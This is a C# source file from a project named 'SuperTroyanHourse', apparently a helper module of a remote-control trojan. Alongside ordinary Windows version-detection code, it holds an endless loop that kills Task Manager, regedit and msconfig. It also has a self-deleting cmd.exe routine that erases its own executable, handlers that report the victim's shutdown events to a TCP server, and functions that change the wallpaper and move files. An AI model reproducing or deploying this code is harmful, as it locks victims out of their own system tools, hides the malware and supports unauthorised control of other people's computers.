using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace SuperTroyanHourse
{
    internal class other
    {
        /// <summary>
        /// Get OS information
        /// </summary>
        public static class OSInfo
        {
            #region EDITION
            static private string s_Edition;
            /// <summary>
            /// Gets the edition of the operating system running on this computer.
            /// </summary>
            static public string Edition
            {
                get
                {
                    if (s_Edition != null)
                        return s_Edition;  //***** RETURN *****//

                    string edition = String.Empty;

                    OperatingSystem osVersion = Environment.OSVersion;
                    OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
                    osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));

                    if (GetVersionEx(ref osVersionInfo))
                    {
                        int majorVersion = osVersion.Version.Major;
                        int minorVersion = osVersion.Version.Minor;
                        byte productType = osVersionInfo.wProductType;
                        short suiteMask = osVersionInfo.wSuiteMask;

                        #region VERSION 4
                        if (majorVersion == 4)
                        {
                            if (productType == VER_NT_WORKSTATION)
                            {
                                // Windows NT 4.0 Workstation
                                edition = "Workstation";
                            }
                            else if (productType == VER_NT_SERVER)
                            {
                                if ((suiteMask & VER_SUITE_ENTERPRISE) != 0)
                                {
                                    // Windows NT 4.0 Server Enterprise
                                    edition = "Enterprise Server";
                                }
                                else
                                {
                                    // Windows NT 4.0 Server
                                    edition = "Standard Server";
                                }
                            }
                        }
                        #endregion VERSION 4

                        #region VERSION 5
                        else if (majorVersion == 5)
                        {
                            if (productType == VER_NT_WORKSTATION)
                            {
                                if ((suiteMask & VER_SUITE_PERSONAL) != 0)
                                {
                                    // Windows XP Home Edition
                                    edition = "Home";
                                }
                                else
                                {
                                    // Windows XP / Windows 2000 Professional
                                    edition = "Professional";
                                }
                            }
                            else if (productType == VER_NT_SERVER)
                            {
                                if (minorVersion == 0)
                                {
                                    if ((suiteMask & VER_SUITE_DATACENTER) != 0)
                                    {
                                        // Windows 2000 Datacenter Server
                                        edition = "Datacenter Server";
                                    }
                                    else if ((suiteMask & VER_SUITE_ENTERPRISE) != 0)
                                    {
                                        // Windows 2000 Advanced Server
                                        edition = "Advanced Server";
                                    }
                                    else
                                    {
                                        // Windows 2000 Server
                                        edition = "Server";
                                    }
                                }
                                else
                                {
                                    if ((suiteMask & VER_SUITE_DATACENTER) != 0)
                                    {
                                        // Windows Server 2003 Datacenter Edition
                                        edition = "Datacenter";
                                    }
                                    else if ((suiteMask & VER_SUITE_ENTERPRISE) != 0)
                                    {
                                        // Windows Server 2003 Enterprise Edition
                                        edition = "Enterprise";
                                    }
                                    else if ((suiteMask & VER_SUITE_BLADE) != 0)
                                    {
                                        // Windows Server 2003 Web Edition
                                        edition = "Web Edition";
                                    }
                                    else
                                    {
                                        // Windows Server 2003 Standard Edition
                                        edition = "Standard";
                                    }
                                }
                            }
                        }
                        #endregion VERSION 5

                        #region VERSION 6
                        else if (majorVersion == 6)
                        {
                            int ed;
                            if (GetProductInfo(majorVersion, minorVersion,
                                osVersionInfo.wServicePackMajor, osVersionInfo.wServicePackMinor,
                                out ed))
                            {
                                switch (ed)
                                {
                                    case PRODUCT_BUSINESS:
                                        edition = "Business";
                                        break;
                                    case PRODUCT_BUSINESS_N:
                                        edition = "Business N";
                                        break;
                                    case PRODUCT_CLUSTER_SERVER:
                                        edition = "HPC Edition";
                                        break;
                                    case PRODUCT_DATACENTER_SERVER:
                                        edition = "Datacenter Server";
                                        break;
                                    case PRODUCT_DATACENTER_SERVER_CORE:
                                        edition = "Datacenter Server (core installation)";
                                        break;
                                    case PRODUCT_ENTERPRISE:
                                        edition = "Enterprise";
                                        break;
                                    case PRODUCT_ENTERPRISE_N:
                                        edition = "Enterprise N";
                                        break;
                                    case PRODUCT_ENTERPRISE_SERVER:
                                        edition = "Enterprise Server";
                                        break;
                                    case PRODUCT_ENTERPRISE_SERVER_CORE:
                                        edition = "Enterprise Server (core installation)";
                                        break;
                                    case PRODUCT_ENTERPRISE_SERVER_CORE_V:
                                        edition = "Enterprise Server without Hyper-V (core installation)";
                                        break;
                                    case PRODUCT_ENTERPRISE_SERVER_IA64:
                                        edition = "Enterprise Server for Itanium-based Systems";
                                        break;
                                    case PRODUCT_ENTERPRISE_SERVER_V:
                                        edition = "Enterprise Server without Hyper-V";
                                        break;
                                    case PRODUCT_HOME_BASIC:
                                        edition = "Home Basic";
                                        break;
                                    case PRODUCT_HOME_BASIC_N:
                                        edition = "Home Basic N";
                                        break;
                                    case PRODUCT_HOME_PREMIUM:
                                        edition = "Home Premium";
                                        break;
                                    case PRODUCT_HOME_PREMIUM_N:
                                        edition = "Home Premium N";
                                        break;
                                    case PRODUCT_HYPERV:
                                        edition = "Microsoft Hyper-V Server";
                                        break;
                                    case PRODUCT_MEDIUMBUSINESS_SERVER_MANAGEMENT:
                                        edition = "Windows Essential Business Management Server";
                                        break;
                                    case PRODUCT_MEDIUMBUSINESS_SERVER_MESSAGING:
                                        edition = "Windows Essential Business Messaging Server";
                                        break;
                                    case PRODUCT_MEDIUMBUSINESS_SERVER_SECURITY:
                                        edition = "Windows Essential Business Security Server";
                                        break;
                                    case PRODUCT_SERVER_FOR_SMALLBUSINESS:
                                        edition = "Windows Essential Server Solutions";
                                        break;
                                    case PRODUCT_SERVER_FOR_SMALLBUSINESS_V:
                                        edition = "Windows Essential Server Solutions without Hyper-V";
                                        break;
                                    case PRODUCT_SMALLBUSINESS_SERVER:
                                        edition = "Windows Small Business Server";
                                        break;
                                    case PRODUCT_STANDARD_SERVER:
                                        edition = "Standard Server";
                                        break;
                                    case PRODUCT_STANDARD_SERVER_CORE:
                                        edition = "Standard Server (core installation)";
                                        break;
                                    case PRODUCT_STANDARD_SERVER_CORE_V:
                                        edition = "Standard Server without Hyper-V (core installation)";
                                        break;
                                    case PRODUCT_STANDARD_SERVER_V:
                                        edition = "Standard Server without Hyper-V";
                                        break;
                                    case PRODUCT_STARTER:
                                        edition = "Starter";
                                        break;
                                    case PRODUCT_STORAGE_ENTERPRISE_SERVER:
                                        edition = "Enterprise Storage Server";
                                        break;
                                    case PRODUCT_STORAGE_EXPRESS_SERVER:
                                        edition = "Express Storage Server";
                                        break;
                                    case PRODUCT_STORAGE_STANDARD_SERVER:
                                        edition = "Standard Storage Server";
                                        break;
                                    case PRODUCT_STORAGE_WORKGROUP_SERVER:
                                        edition = "Workgroup Storage Server";
                                        break;
                                    case PRODUCT_UNDEFINED:
                                        edition = "Unknown product";
                                        break;
                                    case PRODUCT_ULTIMATE:
                                        edition = "Ultimate";
                                        break;
                                    case PRODUCT_ULTIMATE_N:
                                        edition = "Ultimate N";
                                        break;
                                    case PRODUCT_WEB_SERVER:
                                        edition = "Web Server";
                                        break;
                                    case PRODUCT_WEB_SERVER_CORE:
                                        edition = "Web Server (core installation)";
                                        break;
                                }
                            }
                        }
                        #endregion VERSION 6
                    }

                    s_Edition = edition;
                    return edition;
                }
            }
            #endregion EDITION

            #region NAME
            static private string s_Name;
            /// <summary>
            /// Gets the name of the operating system running on this computer.
            /// </summary>
            static public string Name
            {
                get
                {
                    if (s_Name != null)
                        return s_Name;  //***** RETURN *****//

                    string name = "unknown";

                    OperatingSystem osVersion = Environment.OSVersion;
                    OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
                    osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));

                    if (GetVersionEx(ref osVersionInfo))
                    {
                        int majorVersion = osVersion.Version.Major;
                        int minorVersion = osVersion.Version.Minor;

                        switch (osVersion.Platform)
                        {
                            case PlatformID.Win32Windows:
                                {
                                    if (majorVersion == 4)
                                    {
                                        string csdVersion = osVersionInfo.szCSDVersion;
                                        switch (minorVersion)
                                        {
                                            case 0:
                                                if (csdVersion == "B" || csdVersion == "C")
                                                    name = "Windows 95 OSR2";
                                                else
                                                    name = "Windows 95";
                                                break;
                                            case 10:
                                                if (csdVersion == "A")
                                                    name = "Windows 98 Second Edition";
                                                else
                                                    name = "Windows 98";
                                                break;
                                            case 90:
                                                name = "Windows Me";
                                                break;
                                        }
                                    }
                                    break;
                                }

                            case PlatformID.Win32NT:
                                {
                                    byte productType = osVersionInfo.wProductType;
                                    switch (majorVersion)
                                    {
                                        case 3:
                                            name = "Windows NT 3.51";
                                            break;
                                        case 4:
                                            switch (productType)
                                            {
                                                case 1:
                                                    name = "Windows NT 4.0";
                                                    break;
                                                case 3:
                                                    name = "Windows NT 4.0 Server";
                                                    break;
                                            }
                                            break;
                                        case 5:
                                            switch (minorVersion)
                                            {
                                                case 0:
                                                    name = "Windows 2000";
                                                    break;
                                                case 1:
                                                    name = "Windows XP";
                                                    break;
                                                case 2:
                                                    name = "Windows Server 2003";
                                                    break;
                                            }
                                            break;
                                        case 6:
                                            switch(minorVersion)
                                            {
                                                case 0:
                                                    switch (productType)
                                                    {
                                                        case 1:
                                                            name = "Windows Vista";
                                                            break;
                                                        case 3:
                                                            name = "Windows Server 2008";
                                                            break;
                                                    }
                                                    break;
                                                case 1:
                                                    switch (productType)
                                                    {
                                                        case 1:
                                                            name = "Windows 7";
                                                            break;
                                                        case 3:
                                                            name = "Windows Server 2008 R2";
                                                            break;
                                                    }
                                                    break;
                                                case 2:
                                                    switch (productType)
                                                    {
                                                        case 1:
                                                            name = "Windows 8";
                                                            break;
                                                        case 3:
                                                            name = "Windows Server 2012";
                                                            break;
                                                    }
                                                    break;
                                            }
                                            break;
                                    }
                                    break;
                                }
                        }
                    }

                    s_Name = name;
                    return name;
                }
            }
            #endregion NAME

            #region PINVOKE
            #region GET
            #region PRODUCT INFO
            [DllImport("Kernel32.dll")]
            internal static extern bool GetProductInfo(
                int osMajorVersion,
                int osMinorVersion,
                int spMajorVersion,
                int spMinorVersion,
                out int edition);
            #endregion PRODUCT INFO

            #region VERSION
            [DllImport("kernel32.dll")]
            private static extern bool GetVersionEx(ref OSVERSIONINFOEX osVersionInfo);
            #endregion VERSION
            #endregion GET

            #region OSVERSIONINFOEX
            [StructLayout(LayoutKind.Sequential)]
            private struct OSVERSIONINFOEX
            {
                public int dwOSVersionInfoSize;
                public int dwMajorVersion;
                public int dwMinorVersion;
                public int dwBuildNumber;
                public int dwPlatformId;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
                public string szCSDVersion;
                public short wServicePackMajor;
                public short wServicePackMinor;
                public short wSuiteMask;
                public byte wProductType;
                public byte wReserved;
            }
            #endregion OSVERSIONINFOEX

            #region PRODUCT
            private const int PRODUCT_UNDEFINED = 0x00000000;
            private const int PRODUCT_ULTIMATE = 0x00000001;
            private const int PRODUCT_HOME_BASIC = 0x00000002;
            private const int PRODUCT_HOME_PREMIUM = 0x00000003;
            private const int PRODUCT_ENTERPRISE = 0x00000004;
            private const int PRODUCT_HOME_BASIC_N = 0x00000005;
            private const int PRODUCT_BUSINESS = 0x00000006;
            private const int PRODUCT_STANDARD_SERVER = 0x00000007;
            private const int PRODUCT_DATACENTER_SERVER = 0x00000008;
            private const int PRODUCT_SMALLBUSINESS_SERVER = 0x00000009;
            private const int PRODUCT_ENTERPRISE_SERVER = 0x0000000A;
            private const int PRODUCT_STARTER = 0x0000000B;
            private const int PRODUCT_DATACENTER_SERVER_CORE = 0x0000000C;
            private const int PRODUCT_STANDARD_SERVER_CORE = 0x0000000D;
            private const int PRODUCT_ENTERPRISE_SERVER_CORE = 0x0000000E;
            private const int PRODUCT_ENTERPRISE_SERVER_IA64 = 0x0000000F;
            private const int PRODUCT_BUSINESS_N = 0x00000010;
            private const int PRODUCT_WEB_SERVER = 0x00000011;
            private const int PRODUCT_CLUSTER_SERVER = 0x00000012;
            private const int PRODUCT_HOME_SERVER = 0x00000013;
            private const int PRODUCT_STORAGE_EXPRESS_SERVER = 0x00000014;
            private const int PRODUCT_STORAGE_STANDARD_SERVER = 0x00000015;
            private const int PRODUCT_STORAGE_WORKGROUP_SERVER = 0x00000016;
            private const int PRODUCT_STORAGE_ENTERPRISE_SERVER = 0x00000017;
            private const int PRODUCT_SERVER_FOR_SMALLBUSINESS = 0x00000018;
            private const int PRODUCT_SMALLBUSINESS_SERVER_PREMIUM = 0x00000019;
            private const int PRODUCT_HOME_PREMIUM_N = 0x0000001A;
            private const int PRODUCT_ENTERPRISE_N = 0x0000001B;
            private const int PRODUCT_ULTIMATE_N = 0x0000001C;
            private const int PRODUCT_WEB_SERVER_CORE = 0x0000001D;
            private const int PRODUCT_MEDIUMBUSINESS_SERVER_MANAGEMENT = 0x0000001E;
            private const int PRODUCT_MEDIUMBUSINESS_SERVER_SECURITY = 0x0000001F;
            private const int PRODUCT_MEDIUMBUSINESS_SERVER_MESSAGING = 0x00000020;
            private const int PRODUCT_SERVER_FOR_SMALLBUSINESS_V = 0x00000023;
            private const int PRODUCT_STANDARD_SERVER_V = 0x00000024;
            private const int PRODUCT_ENTERPRISE_SERVER_V = 0x00000026;
            private const int PRODUCT_STANDARD_SERVER_CORE_V = 0x00000028;
            private const int PRODUCT_ENTERPRISE_SERVER_CORE_V = 0x00000029;
            private const int PRODUCT_HYPERV = 0x0000002A;
            #endregion PRODUCT

            #region VERSIONS
            private const int VER_NT_WORKSTATION = 1;
            private const int VER_NT_DOMAIN_CONTROLLER = 2;
            private const int VER_NT_SERVER = 3;
            private const int VER_SUITE_SMALLBUSINESS = 1;
            private const int VER_SUITE_ENTERPRISE = 2;
            private const int VER_SUITE_TERMINAL = 16;
            private const int VER_SUITE_DATACENTER = 128;
            private const int VER_SUITE_SINGLEUSERTS = 256;
            private const int VER_SUITE_PERSONAL = 512;
            private const int VER_SUITE_BLADE = 1024;
            #endregion VERSIONS
            #endregion PINVOKE

            #region SERVICE PACK
            /// <summary>
            /// Gets the service pack information of the operating system running on this computer.
            /// </summary>
            static public string ServicePack
            {
                get
                {
                    string servicePack = String.Empty;
                    OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();

                    osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));

                    if (GetVersionEx(ref osVersionInfo))
                    {
                        servicePack = osVersionInfo.szCSDVersion;
                    }

                    return servicePack;
                }
            }
            #endregion SERVICE PACK
        }

        /// <summary>
        /// control the exit from program
        /// </summary>
        /// <remarks>
        /// Unused here
        /// </remarks>
        public static class Exit
        {
            public static bool ConsoleCtrlCheck(CtrlTypes ctrlType)
            {
                // Put your own handler here

                switch (ctrlType)
                {
                    case CtrlTypes.CTRL_C_EVENT:
                        TCPServer.Send("CTRL+C received!");
                        break;
                    case CtrlTypes.CTRL_BREAK_EVENT:
                        TCPServer.Send("CTRL+BREAK received!");
                        break;
                    case CtrlTypes.CTRL_CLOSE_EVENT:
                        TCPServer.Send("Program closed");
                        break;
                    case CtrlTypes.CTRL_LOGOFF_EVENT:
                    case CtrlTypes.CTRL_SHUTDOWN_EVENT:
                        TCPServer.Send("User is logging off!");
                        break;

                }
                Program.isProgramAlive = false;
                return true;
            }

            #region unmanaged
            // Declare the SetConsoleCtrlHandler function
            // as external and receiving a delegate.

            [DllImport("Kernel32")]
            public static extern bool SetConsoleCtrlHandler(HandlerRoutine Handler, bool Add);

            // A delegate type to be used as the handler routine
            // for SetConsoleCtrlHandler.
            public delegate bool HandlerRoutine(CtrlTypes CtrlType);

            // An enumerated type for the control messages
            // sent to the handler routine.
            public enum CtrlTypes
            {
                CTRL_C_EVENT = 0,
                CTRL_BREAK_EVENT,
                CTRL_CLOSE_EVENT,
                CTRL_LOGOFF_EVENT = 5,
                CTRL_SHUTDOWN_EVENT
            }

            #endregion
        }

        /// <summary>
        /// get the information from task manager
        /// </summary>
        public static class PerformanceInfo
        {
            [DllImport("psapi.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool GetPerformanceInfo([Out] out PerformanceInformation PerformanceInformation, [In] int Size);

            [StructLayout(LayoutKind.Sequential)]
            public struct PerformanceInformation
            {
                public int Size;
                public IntPtr CommitTotal;
                public IntPtr CommitLimit;
                public IntPtr CommitPeak;
                public IntPtr PhysicalTotal;
                public IntPtr PhysicalAvailable;
                public IntPtr SystemCache;
                public IntPtr KernelTotal;
                public IntPtr KernelPaged;
                public IntPtr KernelNonPaged;
                public IntPtr PageSize;
                public int HandlesCount;
                public int ProcessCount;
                public int ThreadCount;
            }

            public static Int64 GetPhysicalAvailableMemoryInMiB()
            {
                PerformanceInformation pi = new PerformanceInformation();
                if (GetPerformanceInfo(out pi, Marshal.SizeOf(pi)))
                {
                    return Convert.ToInt64((pi.PhysicalAvailable.ToInt64() * pi.PageSize.ToInt64() / 1048576));
                }
                else
                {
                    return -1;
                }
            }

            public static Int64 GetTotalMemoryInMiB()
            {
                PerformanceInformation pi = new PerformanceInformation();
                if (GetPerformanceInfo(out pi, Marshal.SizeOf(pi)))
                {
                    return Convert.ToInt64((pi.PhysicalTotal.ToInt64() * pi.PageSize.ToInt64() / 1048576));
                }
                else
                {
                    return -1;
                }
            }
        }

        /// <summary>
        /// disables the task manager, msconfig and regedit
        /// </summary>
        public static class TaskManeger
        {
            public static bool StopTaskManager = true;
            public static bool StopRegEdit = true;
            public static bool StopMSCon = true;
            public static void Stop()
            {
                const string task = "Taskmgr";
                const string regEdit = "regedit";
                const string msConfig = "msconfig";
                System.Diagnostics.Process[] all;
                for (; Program.isProgramAlive; )
                {
                    if (StopTaskManager)
                    {
                        all = System.Diagnostics.Process.GetProcessesByName(task);
                        foreach (System.Diagnostics.Process p in all)
                        {
                            try { p.Kill(); }
                            catch { }
                            Console.WriteLine("killed task manager!");
                        }
                    }
                    if (StopRegEdit)
                    {
                        all = System.Diagnostics.Process.GetProcessesByName(regEdit);
                        foreach (System.Diagnostics.Process p in all)
                        {
                            try { p.Kill(); }
                            catch { }
                            Console.WriteLine("killed Registry Edit");
                        }
                    }
                    if (StopMSCon)
                    {
                        all = System.Diagnostics.Process.GetProcessesByName(msConfig);
                        foreach (System.Diagnostics.Process p in all)
                        {
                            try { p.Kill(); }
                            catch { }
                            Console.WriteLine("killed Microsoft Editor");
                        }
                    }
                }
                System.Threading.Thread.Sleep(10);
            }
        }

        public static class DesktopBackgroundChange
        {
            /*
             * source: http://stackoverflow.com/questions/1061678/change-desktop-wallpaper-using-code-in-net
            */

            const int SPI_SETDESKWALLPAPER = 0x14;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDWININICHANGE = 0x02;

            public enum Style
            {
                Tiled,
                Centered,
                Stretched
            }

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

            /// <summary>
            /// set the desktop background
            /// </summary>
            /// <param name="path">the full path to the image</param>
            /// <param name="style">the style of the background</param>
            public static void Set(string path, Style style)
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                if (style == Style.Stretched)
                {
                    key.SetValue(@"WallpaperStyle", "2");
                    key.SetValue(@"TileWallpaper", "0");
                }

                if (style == Style.Centered)
                {
                    key.SetValue(@"WallpaperStyle", "1");
                    key.SetValue(@"TileWallpaper", "0");
                }

                if (style == Style.Tiled)
                {
                    key.SetValue(@"WallpaperStyle", "1");
                    key.SetValue(@"TileWallpaper", "1");
                }

                SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0,
                    path,
                    SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
        }

        /// <summary>
        /// copy folder content to new place
        /// </summary>
        /// <param name="sourceDirName">the source directory</param>
        /// <param name="destDirName">the destination directory</param>
        /// <param name="copySubDirs">copy the sub-directories?</param>
        public static int DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            int result = 0;
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
                result++;
            }

            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    result += 1 + DirectoryCopy(subdir.FullName, temppath, true);
                }
            }
            return result;
        }

        /// <summary>
        /// move folder content to new place
        /// </summary>
        /// <param name="sourceDirName">the source directory</param>
        /// <param name="destDirName">the destination directory</param>
        /// <param name="moveSubDirs">move the sub-directories?</param>
        public static int DirectoryMove(string sourceDirName, string destDirName, bool moveSubDirs)
        {
            int result = 0;
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.MoveTo(temppath);
                result++;
            }

            if (moveSubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    result += DirectoryCopy(subdir.FullName, temppath, true);
                }
            }
            return result;
        }

        public static void SelDelete()
        {
            System.Diagnostics.Process.Start("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \""
                + System.Windows.Forms.Application.ExecutablePath + "\"");
            System.Windows.Forms.Application.Exit();
        }
    }
}